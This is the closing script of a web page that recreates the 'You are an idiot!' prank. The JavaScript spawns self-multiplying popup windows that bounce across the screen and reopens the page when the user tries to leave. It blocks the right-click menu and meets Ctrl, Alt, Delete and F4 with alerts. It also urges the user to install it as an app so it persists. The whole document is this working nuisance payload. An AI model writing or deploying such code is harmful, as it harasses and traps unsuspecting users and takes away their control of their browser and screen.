        const reflect = (n, m) => m - ((n % m) + m) % m;

        const bounce = (b) => {
            xPos += dx;
            yPos += dy;
            const width = screen.width - outerWidth;
            const height = screen.height - outerHeight;
            if (xPos < 0 || xPos > width) {
                const speed = 5 * Math.random() + 5;
                dx = dx > 0 ? -speed : speed;
                xPos = reflect(xPos, width);
                b |= 1;
            }
            if (yPos < 0 || yPos > height) {
                const speed = 5 * Math.random() + 5;
                dy = dy > 0 ? -speed : speed;
                yPos = reflect(yPos, height);
                b |= 2;
            }
            if ((b & 1 ^ (b >> 1)) && Math.random() < 0.2) open(location.href, '', `${size_str},top=${yPos},left=${xPos}`);
            moveTo(xPos, yPos);
            setTimeout(bounce, 1, 0);
        }

        const init = () => {
            valid_state = true;
            document.querySelector('html').style.display = 'block';
            document.querySelector('body').style.display = 'block';
            document.querySelector('svg').style.display = 'block';
            document.title = 'You are an idiot!';
        }

        const loop = (i) => {
            if (matchMedia('(display-mode: standalone)').matches) {
                clearInterval(i);
                audio.play();
                init();
                setTimeout(open, 5000, location.href, '', size_str);
            }
        }

        onbeforeunload = function () {
            if (valid_state) {
                open(location.href, '', `${size_str},top=${yPos},left=${xPos}`);
                return 'Are you an idiot?';
            }
        };

        oncontextmenu = () => false;

        onkeydown = function () {
            if (valid_state) {
                const keyCode = event.keyCode;
                if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) alert('You are an idiot!');
            }
        }

        if (opener?.valid_state) {
            audio.play();
            init();
            dx = 5 * Math.random() + 5;
            if (Math.random() < 0.5) dx *= -1;
            dy = 5 * Math.random() + 5;
            if (Math.random() < 0.5) dy *= -1;
            bounce(3);
        } else {
            const popup = open('', '', size_str);
            if (!popup) alert('Please reload with popups unblocked');
            else {
                popup.close();
                audio.play().then(() => {
                    init();
                    setTimeout(open, 5000, location.href, '', size_str);
                }).catch(() => {
                    alert('Please install the app. It should show up on the address bar within 30 seconds. If not, try reloading the page.');
                    const i = setInterval(() => loop(i), 1000);
                });
            }
        };
    </script>
</body>
